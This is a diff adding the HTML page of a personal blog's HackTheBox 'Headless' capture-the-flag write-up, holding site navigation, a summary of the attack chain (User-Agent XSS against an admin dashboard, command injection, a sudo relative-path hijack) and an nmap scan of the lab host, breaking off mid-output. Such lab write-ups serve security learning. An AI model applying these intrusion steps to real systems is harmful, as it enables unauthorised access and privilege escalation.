@@ -1,0 +1,1474 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta charset='utf-8'>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="index, follow">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
+    integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+    crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
+    integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI"
+    crossorigin="anonymous"></script>
+  <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon" />
+  <script type="text/javascript" async
+    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+    </script>
+  <link rel="stylesheet" href="/assets/css/style.css?v=18d79529ed1a410777646c1aaed0e478c964ecf8">
+  <link rel="stylesheet" href="/assets/css/prism.css">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" rel="stylesheet" crossorigin="anonymous">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/brands.min.css" rel="stylesheet" crossorigin="anonymous">
+  
+  <meta name="theme-color" content="#000000" />
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB Headless writeup | Gabriel blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="HTB Headless writeup" />
+<meta name="author" content="gabri47" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Headless is an Easy Linux machine of HackTheBox where first its needed to make a XSS attack in the User-Agent as its reflected on the admin’s dashboard. Then, we have to inject a command in a user-input field to gain access to the machine. Finally, in the sudo privileges its possible to see that a file is being executed from the current directory without an absolute path, so we can create ours and execute the command we want." />
+<meta property="og:description" content="Headless is an Easy Linux machine of HackTheBox where first its needed to make a XSS attack in the User-Agent as its reflected on the admin’s dashboard. Then, we have to inject a command in a user-input field to gain access to the machine. Finally, in the sudo privileges its possible to see that a file is being executed from the current directory without an absolute path, so we can create ours and execute the command we want." />
+<link rel="canonical" href="http://localhost:4000/writeups/HTB/Headless.html" />
+<meta property="og:url" content="http://localhost:4000/writeups/HTB/Headless.html" />
+<meta property="og:site_name" content="Gabriel blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-07-20T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB Headless writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-07-20T00:00:00+02:00","datePublished":"2024-07-20T00:00:00+02:00","description":"Headless is an Easy Linux machine of HackTheBox where first its needed to make a XSS attack in the User-Agent as its reflected on the admin’s dashboard. Then, we have to inject a command in a user-input field to gain access to the machine. Finally, in the sudo privileges its possible to see that a file is being executed from the current directory without an absolute path, so we can create ours and execute the command we want.","headline":"HTB Headless writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/HTB/Headless.html"},"url":"http://localhost:4000/writeups/HTB/Headless.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  
+</head>
+
+<body>
+
+  <div id="header">
+    <div class="container">
+      <div class="title-container">
+        <a id="a-title" href="/">
+          <h1>Gabriel blog</h1>
+        </a>
+        <small class="nav-main d-flex justify-content-center">
+    
+    <a href="/writeups">Writeups</a>
+    
+     <span style="color: #b5e853;">|</span> 
+    
+    
+    <a href="/blog">Blog</a>
+    
+    
+</small>
+
+      </div>
+      <br>
+
+      
+      
+<nav class="navbar navlinks">
+    <button class="navbar-toggler d-flex w-100 justify-content-between collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="true" aria-label="Toggle navigation">
+        <span>HTB Writeups</span>
+        <i style="float: right;" class="fa fa-bars menu-icon" aria-hidden="true"></i>
+    </button>
+
+    <div class="navbar-collapse collapse" id="navbarSupportedContent">
+        <div class="m-1 mt-2">
+
+            
+            
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Blurry.html"> HTB Blurry writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;clearml/&gt; &lt;machine-learning/&gt; &lt;CVE-2024-24590/&gt; &lt;pickle/&gt; &lt;deserialization/&gt; &lt;python-torch/&gt; &lt;sudoers/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Freelancer.html"> HTB Freelancer writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;forgot-password/&gt; &lt;idor/&gt; &lt;qrcode/&gt; &lt;mssql/&gt; &lt;xp_cmdshell/&gt; &lt;sql-configuration/&gt; &lt;crash-dump-analysis/&gt; &lt;active-directory-acls/&gt; &lt;genericwrite/&gt; &lt;nt-hashes/&gt; &lt;secretsdump/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Boardlight.html"> HTB Boardlight writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;dolibarr/&gt; &lt;CVE-2023-30253/&gt; &lt;subdomain-enumeration/&gt; &lt;crm/&gt; &lt;erp/&gt; &lt;php-injection/&gt; &lt;php-configuration/&gt; &lt;mysql/&gt; &lt;password-reuse/&gt; &lt;suid/&gt; &lt;enlightenment/&gt; &lt;CVE-2022-37706/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Solarlab.html"> HTB Solarlab writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;smb/&gt; &lt;spreadsheet/&gt; &lt;libreoffice/&gt; &lt;bruteforcing-web/&gt; &lt;rce/&gt; &lt;CVE-2023-33733/&gt; &lt;pdf/&gt; &lt;openfire-exploit/&gt; &lt;CVE-2023-32315/&gt; &lt;openfire-database/&gt; &lt;decrypt-password/&gt; &lt;java/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Intuition.html"> HTB Intuition writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;cookie-hijacking/&gt; &lt;cve-2023-24329/&gt; &lt;urllib/&gt; &lt;ssrf/&gt; &lt;ssrf-to-lfi/&gt; &lt;url-wrappers/&gt; &lt;ftp/&gt; &lt;ssh-key/&gt; &lt;ssh-key-comments/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;binary-analysis/&gt; &lt;suricata-logs/&gt; &lt;sudoers/&gt; &lt;ghidra/&gt; &lt;command-execution/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Mailing.html"> HTB Mailing writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;lfi/&gt; &lt;hMailServer/&gt; &lt;hMailServer-configuration/&gt; &lt;hash-cracking/&gt; &lt;outlook-vulnerabilities/&gt; &lt;CVE-2024-21413/&gt; &lt;ntlm-hash/&gt; &lt;libreoffice-odt-exploit/&gt; &lt;CVE-2023-2255/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Skyfall.html"> HTB Skyfall writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;forbidden-bypass/&gt; &lt;minio-cloud/&gt; &lt;minio-cve/&gt; &lt;CVE-2023-28432/&gt; &lt;hashicorp-vault/&gt; &lt;vault-ssh/&gt; &lt;sudoers/&gt; &lt;vault-unseal/&gt; &lt;race-condition/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Runner.html"> HTB Runner writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;teamcity/&gt; &lt;cve-2023-42793/&gt; &lt;teamcity-api/&gt; &lt;teamcity-rce/&gt; &lt;hsql/&gt; &lt;bcrypt/&gt; &lt;hash-cracking/&gt; &lt;id_rsa/&gt; &lt;portainer/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/FormulaX.html"> HTB FormulaX writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;websocket/&gt; &lt;simple-git-cve/&gt; &lt;CVE-2022-24066/&gt; &lt;mongodb/&gt; &lt;hash-cracking/&gt; &lt;librenms/&gt; &lt;librenms-abuse-template/&gt; &lt;laravel-blade/&gt; &lt;php/&gt; &lt;env-creds/&gt; &lt;sudoers/&gt; &lt;libreoffice-server-abuse/&gt; &lt;apache-uno-api/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Usage.html"> HTB Usage writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;sql-injection/&gt; &lt;boolean-based-sql-injection/&gt; &lt;hash-cracking/&gt; &lt;upload-vulnerabilities/&gt; &lt;monit/&gt; &lt;sudoers/&gt; &lt;abuse-symlinks/&gt; &lt;zip/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/IClean.html"> HTB IClean writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;ssti/&gt; &lt;sql/&gt; &lt;password-reuse/&gt; &lt;qpdf/&gt; &lt;sudoers/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/WifineticTwo.html"> HTB WifineticTwo writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;openplc/&gt; &lt;cve-2021-31630/&gt; &lt;wifi-scanning/&gt; &lt;pixiedust/&gt; &lt;port-scanning/&gt; &lt;ssh/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Headless.html"> HTB Headless writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;command-injection/&gt; &lt;sudoers/&gt; &lt;path-hijacking-.//&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Corporate.html"> HTB Corporate writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;bypass-csp/&gt; &lt;cookie-hijacking/&gt; &lt;idor/&gt; &lt;vpn/&gt; &lt;password-spraying/&gt; &lt;.mozilla-enumeration/&gt; &lt;bruteforce-bitwarden-pin/&gt; &lt;source-code-analysis/&gt; &lt;cookie-forging/&gt; &lt;jwt/&gt; &lt;docker-privesc/&gt; &lt;abupve/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Perfection.html"> HTB Perfection writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;ssti/&gt; &lt;ruby/&gt; &lt;crlf-injection/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;sudo-group/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Jab.html"> HTB Jab writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xmpp/&gt; &lt;xmpp-user-enumeration/&gt; &lt;asreproast/&gt; &lt;hash-cracking/&gt; &lt;executedcom/&gt; &lt;dcomexec.py/&gt; &lt;openfire-rce/&gt; &lt;CVE-2023-32315/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Office.html"> HTB Office writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla-information-disclosure/&gt; &lt;CVE-2023-23752/&gt; &lt;smb-enumeration/&gt; &lt;pcap-tcp-packet-analysis/&gt; &lt;wireshark/&gt; &lt;krb-hash/&gt; &lt;joomla-rce/&gt; &lt;runascs/&gt; &lt;password-reuse/&gt; &lt;port-forwading/&gt; &lt;libreoffice-odt-exploitation/&gt; &lt;CVE-2023-2255/&gt; &lt;dpapi-creds/&gt; &lt;mimikatz/&gt; &lt;bloodhound/&gt; &lt;modifying-group-policy/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Crafty.html"> HTB Crafty writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;minecraft/&gt; &lt;log4j/&gt; &lt;jdgui/&gt; &lt;analyzing-jar/&gt; &lt;minecraft-plugins/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Pov.html"> HTB Pov Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;lfi/&gt; &lt;web.config/&gt; &lt;deserialization/&gt; &lt;exploiting-viewstate/&gt; &lt;decrypting-securestring/&gt; &lt;sedebugprivilege/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Analysis.html"> HTB Analysis Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;ldap-injection/&gt; &lt;php-shell/&gt; &lt;upload-vulnerabilities/&gt; &lt;autologon/&gt; &lt;dll-injection/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Bizness.html"> HTB Bizness Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;apache_ofbiz/&gt; &lt;CVE-2023-51467/&gt; &lt;CVE-2023-49070/&gt; &lt;hash_cracking/&gt; &lt;hash_salt/&gt; &lt;su/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Ouija.html"> HTB Ouija Writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;html_inspection/&gt; &lt;information_leakage/&gt; &lt;haproxy/&gt; &lt;http_request_smuggling/&gt; &lt;CVE-2021-40346/&gt; &lt;source_code_inspection/&gt; &lt;hash_extension_attack/&gt; &lt;lfi/&gt; &lt;proc_files/&gt; &lt;php_plugin/&gt; &lt;integer_overflow/&gt; &lt;buffer_overflow/&gt; &lt;webshell/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Monitored.html"> HTB Monitored Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;udp/&gt; &lt;snmp/&gt; &lt;nagiosxi/&gt; &lt;api/&gt; &lt;nagios_rce/&gt; &lt;sudoers/&gt; &lt;abusing_nagios_scripts/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Napper.html"> HTB Napper Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;information_disclosure/&gt; &lt;abusing_backdoor/&gt; &lt;naplistener/&gt; &lt;elasticsearch/&gt; &lt;reverse_engineering/&gt; &lt;go_reverse_engineering/&gt; &lt;decryption_with_AES/&gt; &lt;runascs/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Devvortex.html"> HTB Devvortex Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla/&gt; &lt;CVE-2023-23752/&gt; &lt;information_leakage/&gt; &lt;password_reuse/&gt; &lt;joomla_rce/&gt; &lt;database_enumeration/&gt; &lt;hash_cracking/&gt; &lt;ssh/&gt; &lt;sudoers/&gt; &lt;apport-cli/&gt; &lt;CVE-2023-1326/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Surveillance.html"> HTB Surveillance writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;craft_cms/&gt; &lt;hash_cracking/&gt; &lt;zoneminder_exploit/&gt; &lt;sudoers/&gt; &lt;abusing_zmupdate.pl/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Hospital.html"> HTB Hospital Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;webshell_upload/&gt; &lt;kernel_exploits/&gt; &lt;hash_cracking/&gt; &lt;pivoting/&gt; &lt;phishing/&gt; &lt;ghostscript_rce/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Codify.html"> HTB Codify Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;nodejs/&gt; &lt;rce/&gt; &lt;sqlite3/&gt; &lt;hashes/&gt; &lt;sudoers/&gt; &lt;bash-bruteforcing/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+      
+      <div id="bottom-bar">
+        <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+      </div>
+    </div>
+  </div>
+
+  <div id="content" class="container">
+    <section id="main_content">
+      <h5 class="mt-0 mb-2">
+        
+        
+          HTB
+        
+        
+      </h5>
+    
+      <h1 class="d-flex w-100 justify-content-between">
+        
+        
+          <span>HTB Headless writeup</span> <span class="points"> [20 pts] </span>
+        
+        
+      </h1>
+
+
+<script>
+
+</script>
+
+<p>Headless is an Easy Linux machine of HackTheBox where first its needed to make a XSS attack in the User-Agent as its reflected on the admin’s dashboard. Then, we have to inject a command in a user-input field to gain access to the machine. Finally, in the sudo privileges its possible to see that a file is being executed from the current directory without an absolute path, so we can create ours and execute the command we want.</p>
+    
+      <h1 id="enumeration">
+        
+        
+          Enumeration <a href="#enumeration" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h1>
+    
+      <h2 id="port-scanning">
+        
+        
+          Port scanning <a href="#port-scanning" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h2>
+
+<p>I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:</p>
+
+<pre><code class="language-bash">❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.8
+# Nmap 7.94SVN scan initiated Sat Jul 20 19:15:57 2024 as: nmap -sSVC -p- --open --min-rate 5000 -v -n -Pn -oN headless 10.10.11.8
+Nmap scan report for 10.10.11.8
+Host is up (0.24s latency).
+Not shown: 37194 closed tcp ports (reset), 28339 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
+|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
+5000/tcp open  upnp?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/2.2.2 Python/3.11.2
+|     Date: Sat, 20 Jul 2024 17:08:23 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 2799
+|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang="en"&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="UTF-8"&gt;
+|     &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+|     &lt;title&gt;Under Construction&lt;/title&gt;
+|     &lt;style&gt;
+|     body {
+|     font-family: 'Arial', sans-serif;
+|     background-color: #f7f7f7;
+|     margin: 0;
+|     padding: 0;
+|     display: flex;
+|     justify-content: center;
+|     align-items: center;
+|     height: 100vh;
+|     .container {
+|     text-align: center;
+|     background-color: #fff;
+|     border-radius: 10px;
+|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
+|   RTSPRequest: 
+|     &lt;!DOCTYPE HTML&gt;
+|     &lt;html lang="en"&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="utf-8"&gt;
+|     &lt;title&gt;Error response&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;h1&gt;Error response&lt;/h1&gt;
+|     &lt;p&gt;Error code: 400&lt;/p&gt;
+|     &lt;p&gt;Message: Bad request version ('RTSP/1.0').&lt;/p&gt;
+|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port5000-TCP:V=7.94SVN%I=7%D=7/20%Time=669BF0EA%P=x86_64-pc-linux-gnu%r
+SF:(GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
+SF:x20Python/3\.11\.2\r\nDate:\x20Sat,\x2020\x20Jul\x202024\x2017:08:23\x2
+SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
+SF:\x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Z
+SF:fs;\x20Path=/\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\
+SF:x20lang=\"en\"&gt;\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\"UTF-8\"&gt;\n\
+SF:x20\x20\x20\x20&lt;meta\x20name=\"viewport\"\x20content=\"width=device-wid
+SF:th,\x20initial-scale=1\.0\"&gt;\n\x20\x20\x20\x20&lt;title&gt;Under\x20Construct
+SF:ion&lt;/title&gt;\n\x20\x20\x20\x20&lt;style&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20b
+SF:ody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\
+SF:x20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
